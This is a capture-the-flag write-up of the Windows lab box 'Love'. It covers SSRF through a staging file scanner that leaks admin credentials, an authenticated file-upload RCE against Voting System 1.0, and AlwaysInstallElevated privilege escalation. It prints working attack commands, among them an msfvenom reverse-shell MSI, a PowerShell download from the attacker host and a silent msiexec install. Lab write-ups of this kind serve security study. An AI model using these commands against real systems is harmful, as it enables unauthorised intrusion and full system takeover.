# Love — Easy — Windows

**Date:** 1 August 2026

---

## Tags
`#windows` `#web` `#ssrf` `#voting-system` `#file-upload` `#authenticated-rce` `#alwaysinstallelevated` `#msi` `#winpeas` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | love.htb / staging.love.htb (10.129.48.103)                   |
| OS         | Windows 10 Pro (19042)                                         |
| Open ports | 80, 135, 139, 443, 445, 3306, 5000, 5040, 5985, 5986, 47001    |
| Services   | Apache 2.4.46 (PHP 7.3.27); MariaDB; WinRM; SMB                 |
| Web apps   | Voting System 1.0 (80); Free File Scanner (staging, 443); internal app (5000, 403) |
| Foothold   | SSRF on file scanner → leak creds from :5000 → Voting System auth file-upload RCE |
| User       | phoebe                                                         |
| Privesc    | AlwaysInstallElevated (HKLM+HKCU) → malicious MSI → nt authority\system |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.48.103

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-02 17:06 +0100
Nmap scan report for staging.love.htb (10.129.48.103)
Host is up (0.17s latency).
Not shown: 65514 closed tcp ports (reset)
PORT      STATE    SERVICE
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
443/tcp   open     https
445/tcp   open     microsoft-ds
3306/tcp  open     mysql
5000/tcp  open     upnp
5040/tcp  open     unknown
5985/tcp  open     wsman
5986/tcp  open     wsmans
7680/tcp  open     pando-pub
47001/tcp open     winrm
49664-49670/tcp open  (dynamic RPC)

Nmap done: 1 IP address (1 host up) scanned in ~30s
```

> **Note:** filtered and high-numbered dynamic ports were set aside for the next step as not
> immediately relevant.

<img width="999" height="814" alt="image" src="https://github.com/user-attachments/assets/64f9ec0a-1f57-418f-8a1f-2657284fbcec" />

```
nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001 10.129.48.103

PORT      STATE  SERVICE      VERSION
80/tcp    open   http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: Secure file scanner
443/tcp   open   ssl/http     Apache httpd 2.4.46 (PHP/7.3.27)
|_http-title: 403 Forbidden
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/...
445/tcp   open   microsoft-ds Windows 10 Pro 19042 (workgroup: WORKGROUP)
3306/tcp  open   mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open   http         Apache httpd 2.4.46 (PHP/7.3.27)
|_http-title: 403 Forbidden
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0
5986/tcp  open   ssl/wsmans?
| ssl-cert: Subject: commonName=LOVE ...
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows

| smb-os-discovery:
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   Computer name: Love
|_  Workgroup: WORKGROUP

Nmap done: 1 IP address (1 host up) scanned in 179.56 seconds
```

<img width="1609" height="1197" alt="image" src="https://github.com/user-attachments/assets/c22ffa5f-a222-461b-a704-923fc3e8e377" />

**What each port tells me:**
- **Port 80 (HTTP)** — the main web app (a Voting System login).
- **Port 135 (MSRPC)** — Windows RPC endpoint mapper; confirms a standard Windows host.
- **Ports 139, 445 (SMB)** — file sharing; worth checking for anonymous access or leaked data.
- **Port 443 (HTTPS)** — another Apache app; its TLS cert leaks the **staging.love.htb** subdomain (add to /etc/hosts).
- **Port 3306 (MySQL/MariaDB)** — a DB, useful only once I have credentials.
- **Ports 5000 / 5985 / 47001 (HTTP)** — 5000 returns **403 Forbidden** to me, a strong sign it's meant to be reachable only from localhost (a good SSRF target). 5985/47001 are WinRM/HTTPAPI.
- **Port 5040** — shows up with no useful banner; ignorable.
- **Port 5986 (WinRM over TLS)** — my likely shell route if I recover admin creds.
- **Port 7680 (DoSvc)** — Windows Delivery Optimization; not an attack surface.
- **Ports 49664–49670 (MSRPC)** — dynamic high RPC ports, normal Windows behaviour.

---

## Enumeration Log

```
OBSERVATION:
- Port 80 hosts a Voting System login needing credentials
- SMB doesn't allow anonymous access
- The 443 cert leaked staging.love.htb; browsing it shows a "Free File Scanner" that accepts a URL
  to fetch/scan a file
- Port 3306 is not useful yet (no creds); the other HTTP ports show nothing meaningful
WHAT IT TELLS ME:
- I need credentials for the Voting System
- The file scanner fetching arbitrary URLs is an SSRF primitive, I can make the server request
  internal resources on my behalf, including the localhost-only :5000 app
WHAT I AM GOING TO TRY:
- Research the Voting System app for known vulns/default creds
- Point the file scanner at the internal service on port 5000
WHY:
- To find a way into the Voting System
- Because 5000 returns 403 externally but the server itself can reach it (SSRF)
RESULT:
- The app is "Voting System 1.0" (PHP), which has public RCE vulnerabilities
- SMB: no anonymous login
- Scanning http://localhost:5000 through the file scanner (the box IP didn't work, but
  http://localhost:5000 did) returned a set of credentials
WHAT NEXT: Use the recovered creds to log into the Voting System
```

<img width="2354" height="980" alt="image" src="https://github.com/user-attachments/assets/8020becd-c184-4340-974c-35802d3a8de5" />

<img width="695" height="113" alt="image" src="https://github.com/user-attachments/assets/cb3df9e0-a8e6-4ee5-8d20-776853432a20" />

<img width="2294" height="950" alt="image" src="https://github.com/user-attachments/assets/0f1e493a-271c-496d-a397-e1dea47be516" />

<img width="2524" height="401" alt="image" src="https://github.com/user-attachments/assets/8e3c07e4-bf9f-4143-8a1b-acfade055d89" />

<img width="1914" height="1130" alt="image" src="https://github.com/user-attachments/assets/bca0f91b-191f-469c-a700-b4a3bf269b03" />

```
OBSERVATION:
- The creds failed at http://10.129.48.103/index.php ("Cannot find voter with the ID")
- Directory fuzzing found http://10.129.48.103/admin/ the same app's admin panel and the creds
  logged in there
WHAT IT TELLS ME: I have admin access to Voting System 1.0, which has an authenticated file-upload RCE
WHAT I AM GOING TO TRY: Use the file-upload RCE (searchsploit) to get a foothold
WHY: With admin creds, the upload RCE gives code execution
RESULT:
- Adapted exploit 49445.py (fixed IPs/ports and changed the URL to http://{IP}/admin/index.php from
  the hardcoded .../votesystem/admin/index.php)
- Got a foothold and read user.txt (user: phoebe)
WHAT NEXT: Enumerate for a privesc path
```

<img width="1703" height="479" alt="image" src="https://github.com/user-attachments/assets/617ff6ab-b0ca-406c-8f6d-c0bbbb13caf4" />

<img width="2455" height="772" alt="image" src="https://github.com/user-attachments/assets/bb947013-b700-4bbd-8c49-78c91d4c287d" />

<img width="2553" height="743" alt="image" src="https://github.com/user-attachments/assets/02991097-4cf4-44de-a489-ebfabb510316" />

<img width="827" height="155" alt="image" src="https://github.com/user-attachments/assets/d997f0ff-0502-451d-86b5-543f58406b9f" />

<img width="930" height="311" alt="image" src="https://github.com/user-attachments/assets/f0d5523a-ba3e-497b-873b-aa45e9b6301d" />

<img width="750" height="323" alt="image" src="https://github.com/user-attachments/assets/962dfeb1-7d5e-45d0-8fd8-4d8087ba33fb" />

```
OBSERVATION:
- winPEAS flagged "Checking AlwaysInstallElevated" set in BOTH HKLM and HKCU a known Windows
  local privesc
WHAT IT TELLS ME: With AlwaysInstallElevated enabled in both hives, any user can install (run) a
  .msi package as NT AUTHORITY\SYSTEM
WHAT I AM GOING TO TRY: Build a malicious MSI reverse shell and install it (per the HackTricks
  AlwaysInstallElevated technique)
WHY: It's a reliable, known privesc when both registry keys are set
RESULT:
- Generated a reverse-shell MSI with msfvenom, transferred it, ran msiexec, and caught a shell as
  nt authority\system, read root.txt
```

<img width="1577" height="339" alt="image" src="https://github.com/user-attachments/assets/581d028f-1b14-40ef-8b11-70cc2a390617" />

<img width="1141" height="200" alt="image" src="https://github.com/user-attachments/assets/765d6030-427c-46ef-b555-02cd0d987398" />

<img width="1120" height="128" alt="image" src="https://github.com/user-attachments/assets/0eec4b43-5473-4f71-8ac5-b9af8990e0e6" />

<img width="961" height="182" alt="image" src="https://github.com/user-attachments/assets/ab19d5ae-05a6-4332-a1c8-9d39030808bf" />

<img width="1389" height="101" alt="image" src="https://github.com/user-attachments/assets/b282bfc6-1052-410a-be6c-a6d8c628c30c" />

<img width="911" height="756" alt="image" src="https://github.com/user-attachments/assets/0e23cbf9-b3e6-41fa-8ad6-b6b781953a8b" />

---

## Foothold

**How I got in:** The `staging.love.htb` subdomain (leaked in the port-443 TLS certificate) hosted a "Free File Scanner" that fetches a user-supplied URL, a classic **SSRF**. Port 5000 returned 403 to me externally but was reachable by the server itself, so I pointed the scanner at `http://localhost:5000`, which returned a set of credentials. Those didn't work on the main Voting System page but did log into its admin panel at `/admin/`. **Voting System 1.0** has an **authenticated file-upload RCE**, which I used to drop a web shell and get a shell as **phoebe**.

**Command / exploit used:**
```
echo "10.129.48.103  love.htb staging.love.htb" | sudo tee -a /etc/hosts

# SSRF: use the file scanner to read the localhost-only service
#   URL field → http://localhost:5000   → returns admin credentials

# authenticated file-upload RCE against Voting System 1.0
searchsploit -m php/webapps/49445.py
# edit: set target/attacker IPs+ports, and change the path to http://<IP>/admin/index.php
python3 49445.py
nc -lnvp <LPORT>          # → shell as phoebe
```

**Why it worked:** The file scanner performed server-side requests to any URL without restricting internal targetsm, textbook SSRF, so it happily fetched the localhost-only page and handed me its secrets. Those credentials unlocked the Voting System admin panel, whose upload feature (in v1.0) doesn't properly validate uploaded files, allowing a PHP web shell to be stored and executed.

---

## Privilege Escalation

**Path taken (phoebe → SYSTEM):** Running **winPEAS** flagged **AlwaysInstallElevated** enabled in *both* `HKLM` and `HKCU`. That policy tells the Windows Installer to run `.msi` packages with elevated (SYSTEM) privileges regardless of the invoking user, so any user can install a package as SYSTEM. I generated a reverse-shell MSI with msfvenom, transferred it to the box, and ran it with `msiexec`, catching a shell as **nt authority\system** and reading root.txt.

```
# build the malicious installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f msi -o rev.msi
# on target (as phoebe): download and install
powershell -c "Invoke-WebRequest http://<LHOST>/rev.msi -OutFile C:\Users\Public\rev.msi"
msiexec /quiet /qn /i C:\Users\Public\rev.msi
# attacker listener → nt authority\system
```

**Why it worked:** `AlwaysInstallElevated` is only dangerous when set in **both** the machine (HKLM) and user (HKCU) hives which was the case here. When both are `1`, MSI installs always run as SYSTEM, turning "any user can run an installer" into "any user can run code as SYSTEM." It's a pure misconfiguration: the fix is simply not enabling that policy.

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Abused an SSRF in the staging file scanner to read the localhost-only service on port 5000 and leak admin credentials, then used Voting System 1.0's authenticated file-upload RCE to get a shell as phoebe.
2. **Privesc technique in one sentence:** winPEAS revealed AlwaysInstallElevated set in both HKLM and HKCU, so I installed a malicious msfvenom MSI with msiexec to get an nt authority\system shell.
